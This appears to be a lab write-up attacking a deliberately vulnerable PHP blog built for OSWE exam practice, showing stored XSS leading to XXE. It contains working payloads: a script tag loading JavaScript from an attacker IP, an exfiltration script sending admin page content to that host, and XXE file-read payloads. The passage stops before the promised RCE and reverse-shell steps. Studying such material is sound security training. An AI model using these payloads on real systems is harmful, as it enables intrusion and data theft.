# SecAura's Blog - White-Box Analysis & Exploitation Chain
## XSS → XXE → RCE → Reverse Shell Attack Path



## Application Overview

**SecAura** is a PHP-based blog application running on Windows Server with MySQL database backend. The application implements a simple two-tier access control system:

* **Regular Users**: Can submit comments and view approved comments without authentication
* **Admin Users**: Have complete administrative privileges including comment moderation and file upload capabilities

**Key Characteristics**: 
- Comments require admin approval before being publicly visible
- Admin interface includes XML file upload functionality
- Hidden debug functionality with command execution capabilities



## Phase 1: Cross-Site Scripting (XSS) Discovery & Exploitation

### Initial Vulnerability Assessment

Testing the comment submission feature with a basic XSS payload:

```javascript
"><script>alert(1)</script>
```

**Result**: Alert dialog executed when admin accessed `/secaura/admin.php`, confirming **Stored XSS vulnerability** in the comment approval interface.

### Authentication Mechanism Analysis

#### Access Control Investigation

Browser Developer Tools revealed **no session cookies** for authentication. Investigation focused on understanding the access control mechanism.

#### Source Code Review

The `/admin.php` file contains the authentication logic:

```php
<?php
// Code to check if user came from localhost or not
include("isAdmin.php");
include("header.php");
?>
```

The `isAdmin.php` file implements IP-based access control:

```php
<?php
// Code to check if user came from localhost or not
function isLocalhost($whitelist = ['127.0.0.1', '::1']) {
    return in_array($_SERVER['REMOTE_ADDR'], $whitelist);
}

if (isLocalhost() == 1){
    // echo "Welcome localhost";
}else{
    echo "you arent localhost";
    header('Location: /blog/?error=Not allowed');
}
?>
```

**Analysis**: Administrative functions are restricted to localhost connections only, creating an exploitable security boundary through XSS.

### XSS Exploitation Strategy

#### Problem & Solution

Traditional cookie theft is ineffective due to the lack of session-based authentication. Instead, I leveraged the stored XSS to execute JavaScript in the admin's browser context (localhost), allowing:

1. Fetching restricted admin endpoints
2. Exfiltrating admin page content
3. Performing actions on behalf of the admin

#### Implementation

**Payload Delivery**:
```javascript
"><script src=http://192.168.32.133/xss_admin_pages.js></script>
```

**Exfiltration Script** (`xss_admin_pages.js`):
```javascript
// malicious JavaScript file
path = "admin.php"; // adjust the path

fetch(path).then(function (response) {
    return response.text();
}).then(function (html) {
    let url = "http://192.168.32.133/content"; // change the IP
    let params = "?url=" + encodeURIComponent(path) + "&content=" + encodeURIComponent(html);
    fetch(url + params, {
        method: "GET"
    });
}).catch(function (err) {
    console.warn('Something went wrong.', err);
});
```

#### Execution Results

**Attack Flow**:
1. Submit malicious comment with XSS payload
2. Start HTTP listener on attacker machine
3. Wait for admin to review comments
4. Receive exfiltrated admin page content

**Listener Output**:
```bash
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.32.1 - - [12/Sep/2025 09:18:38] "GET /xss_admin_pages.js HTTP/1.1" 200 -
192.168.32.1 - - [12/Sep/2025 09:18:38] code 404, message File not found
192.168.32.1 - - [12/Sep/2025 09:18:38] "GET /content?url=admin.php&content=%0D%0A%3C!DOCTYPE%20html%3E%0D%0A%3Chtml%20lang%3D%22en%22%3E%0D%0A%20%20%20%20%3Chead%3E%0D%0A%20%20%20%20%20%20%20%20%3Cmeta%20charset%3D%22utf-8%22%20%2F%3E%0D%0A%20%20%20%20%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1%2C%20shrink-to-fit%3Dno%22%20%2F%3E%0D%0A%20%20%20%20%20%20%20%20%3Cmeta%20name%3D%22description%22%20content%3D%22%22%20%2F%3E%0D%0A%20%20%20%20%20%20%20%20%3Cmeta%20name%3D%22author%22%20content%3D%22%22%20%2F%3E%0D%0A%20%20%20%20%20%20%20%20%3Ctitle%3ESecAura%27s%20Blog!%20(OSWE%20PREP)%3C%2Ftitle%3E%0D%0A%20%20%20%20%20%20%20%20%3C!--%20Favicon--%3E%0D%0A%20%20%20%20%20%20%20%20%3Clink%20rel%3D%22icon%22%20type%3D%22image%2Fx-icon%22%20href%3D%22assets%2Ffavicon.ico%22%20%2F%3E%0D%0A%20%20%20%20%20%20%20%20%3C!--%20Core%20theme%20CSS%20(includes%20Bootstrap)--%3E%0D%0A%20%20%20%20%20%20%20%20%3Clink%20href%3D%22css%2Fstyles.css%22%20rel%3D%22stylesheet%22%20%2F%3E%0D%0A%20%20%20%20%3C%2Fhead%3E%0D%0A%20%20%20%20%3Cbody%3E%0D%0A%20%20%20%20%20%20%20%20%3C!--%20Responsive%20navbar--%3E%0D%0A%20%20%20%20%20%20%20%20%3Cnav%20class%3D%22navbar%20navbar-expand-lg%20navbar-dark%20bg-dark%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22container%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class%3D%22navbar-brand%22%20href%3D%22%23!%22%3ESecAura%27s%20Blog!%20(OSWE%20PREP)%3C%2Fa%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class%3D%22navbar-toggler%22%20type%3D%22button%22%20data-bs-toggle%3D%22collapse%22%20data-bs-target%3D%22%23navbarSupportedContent%22%20aria-controls%3D%22navbarSupportedContent%22%20aria-expanded%3D%22false%22%20aria-label%3D%22Toggle%20navigation%22%3E%3Cspan%20class%3D%22navbar-toggler-icon%22%3E%3C%2Fspan%3E%3C%2Fbutton%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22collapse%20navbar-collapse%22%20id%3D%22navbarSupportedContent%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22navbar-nav%20ms-auto%20mb-2%20mb-lg-0%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%20class%3D%22nav-item%22%3E%3Ca%20class%3D%22nav-link%20active%22%20aria-current%3D%22page%22%20href%3D%22index.php%22%3EBlog%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%20class%3D%22nav-item%22%3E%3Ca%20class%3D%22nav-link%22%20href%3D%22admin.php%22%3EAdmin%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Ful%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%3C%2Fnav%3E%20%3C!--%20contains%20the%20header.php%20%2B%20isAdmin.php%20code%20(cleaner%20code)%20--%3E%0D%0A%0D%0A%20%20%20%20%20%20%20%20%3C!--%20Page%20content--%3E%0D%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22container%20mt-5%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22row%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22col-lg-8%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Post%20content--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Carticle%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Post%20header--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cheader%20class%3D%22mb-4%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Post%20title--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%22fw-bolder%20mb-1%22%3EWelcome%20to%20SecAura%27s%20Blog!%20(OSWE%20PREP)%3C%2Fh1%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Post%20meta%20content--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22text-muted%20fst-italic%20mb-2%22%3ELike%20and%20Subscribe!%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Post%20categories--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class%3D%22badge%20bg-secondary%20text-decoration-none%20link-light%22%20href%3D%22%23!%22%3EWeb%20Design%3C%2Fa%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class%3D%22badge%20bg-secondary%20text-decoration-none%20link-light%22%20href%3D%22%23!%22%3EFreebies%3C%2Fa%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class%3D%22badge%20bg-secondary%20text-decoration-none%20link-light%22%20href%3D%22upload.php%22%3Eupload(WIP)%3C%2Fa%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fheader%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Preview%20image%20figure--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfigure%20class%3D%22mb-4%22%3E%3Cimg%20class%3D%22img-fluid%20rounded%22%20src%3D%22banner.PNG%22%20alt%3D%22...%22%20%2F%3E%3C%2Ffigure%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Farticle%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%3EComments%20Review%20Panel%3C%2Fh1%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbr%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22d-flex%20mb-4%22%3E%20%20%20%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22d-flex%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22flex-shrink-0%22%3E%3Cimg%20class%3D%22rounded-circle%22%20src%3D%22https%3A%2F%2Fdummyimage.com%2F50x50%2Fced4da%2F6c757d.jpg%22%20alt%3D%22...%22%20%2F%3E%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22ms-3%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22fw-bold%22%3ETest%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22%3E%3Cscript%20src%3Dhttp%3A%2F%2F192.168.32.133%2Fxss_admin_pages.js%3E%3C%2Fscript%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22ms-4%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20method%3D%22get%22%20action%3D%22%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class%3D%22form-control%20btn-success%22%20type%3D%22submit%22%20name%3D%22approveID%22%20value%3D16%20%3EApprove%20Comment%3C%2Fbutton%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fform%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%20%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22ms-4%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20method%3D%22get%22%20action%3D%22%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class%3D%22form-control%20btn-danger%22%20type%3D%22submit%22%20name%3D%22deleteID%22%20value%3D16%20%3EDelete%20Comment%3C%2Fbutton%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fform%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%20%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%20%0D%0A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%0D%0A%0D%0A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Side%20widgets--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22col-lg-4%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Search%20widget--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20%3Cdiv%20class%3D%22card%20mb-4%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card-header%22%3ESearch%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card-body%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22input-group%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20class%3D%22form-control%22%20type%3D%22text%22%20placeholder%3D%22Enter%20search%20term...%22%20aria-label%3D%22Enter%20search%20term...%22%20aria-describedby%3D%22button-search%22%20%2F%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class%3D%22btn%20btn-primary%22%20id%3D%22button-search%22%20type%3D%22button%22%3EGo!%3C%2Fbutton%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%20--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Categories%20widget--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card%20mb-4%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card-header%22%3EAttacks%20Covered%20%3A)%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card-body%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22row%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22col-sm-6%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22list-unstyled%20mb-0%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3EXSS%20(Cross%20Site%20Scripting)%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3ESession%20riding(XSS)%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3EXXE%20(XML%20external%20Entity)%20Injection%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Ful%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22col-sm-6%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22list-unstyled%20mb-0%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3ELFI%20(Local%20File%20Inclusion)%20via%20XXE%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3ERCE%20(Remote%20Code%20Execution)%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3EReverse%20Shelling%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Ful%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Categories%20widget--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card%20mb-4%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card-header%22%3ELanguages%20Covered%20%3A)%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card-body%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22row%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22col-sm-6%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22list-unstyled%20mb-0%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3EPHP%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3ESQL%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3EJavaScript%20%2B%20XHR%20(XML%20HTTP%20Requests)%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Ful%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22col-sm-6%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22list-unstyled%20mb-0%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3EPython%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3EXML%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3ETutorials%3C%2Fa%3E%3C%2Fli%3E%20--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Ful%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Side%20widget--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card%20mb-4%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card-header%22%3ELike%20and%20subscribe%20please%20%3A)%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card-body%22%3EThis%20website%20is%20being%20used%20as%20a%20proof%20of%20concept%20to%20teach%20the%20developement%20side%20of%20a%20basic%20PHP%20web%20app%20and%20attacks%20for%20the%20support%20of%20the%20%3Ca%20href%3D%22https%3A%2F%2Fwww.offensive-security.com%2Fawae-oswe%2F%22%3EOSWE%3Ca%3E(offensive%20security%20web%20expert)%20exam%20by%20%3Cb%3ESecAura%3C%2Fb%3E%20%3A)%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%0D%0A%20%20%20%20%20%20%20%20%3C!--%20Footer--%3E%0D%0A%20%20%20%20%20%20%20%20%3Cfooter%20class%3D%22py-5%20bg-dark%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22container%22%3E%3Cp%20class%3D%22m-0%20text-center%20text-white%22%3ECopyright%20%26copy%3B%20Your%20Website%202021%3C%2Fp%3E%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%3C%2Ffooter%3E%0D%0A%20%20%20%20%20%20%20%20%3C!--%20Bootstrap%20core%20JS--%3E%0D%0A%20%20%20%20%20%20%20%20%3Cscript%20src%3D%22https%3A%2F%2Fcdn.jsdelivr.net%2Fnpm%2Fbootstrap%405.1.3%2Fdist%2Fjs%2Fbootstrap.bundle.min.js%22%3E%3C%2Fscript%3E%0D%0A%20%20%20%20%20%20%20%20%3C!--%20Core%20theme%20JS--%3E%0D%0A%20%20%20%20%20%20%20%20%3Cscript%20src%3D%22js%2Fscripts.js%22%3E%3C%2Fscript%3E%0D%0A%20%20%20%20%3C%2Fbody%3E%0D%0A%3C%2Fhtml%3E%3C!--%20contains%20the%20footer.php%20code%20(cleaner%20code)%20--%3E HTTP/1.1" 404 -

```



## Phase 2: XML External Entity (XXE) Injection Discovery

### File Upload Functionality Analysis

Through the XSS-obtained admin access, I discovered XML file upload functionality accepting this format:

```xml
<comments>
    <name>Hacker</name>
    <comment>This is a comment.</comment>
</comments>
```

**Processing Result**:
```
Name: Hacker
Comment: This is a comment.
```

### XXE Vulnerability Testing

#### Basic Entity Injection

**Test Payload**:
```xml
<!DOCTYPE replace [<!ENTITY example "XXE Verified!"> ]>
<comments>
    <name>Hacker</name>
    <comment>&example;</comment>
</comments>
```

**Result**:
```
Name: Hacker
Comment: XXE Verified!
```

✅ **XXE vulnerability confirmed**

### XXE Exploitation for File Reading

#### Local File Inclusion via XXE

**Payload**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxeFileRead [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=upload.php">]>
<comments>
    <name>Hacker</name>
    <comment>&file;</comment>
</comments>
```

**Result**:
```
Name: Hacker
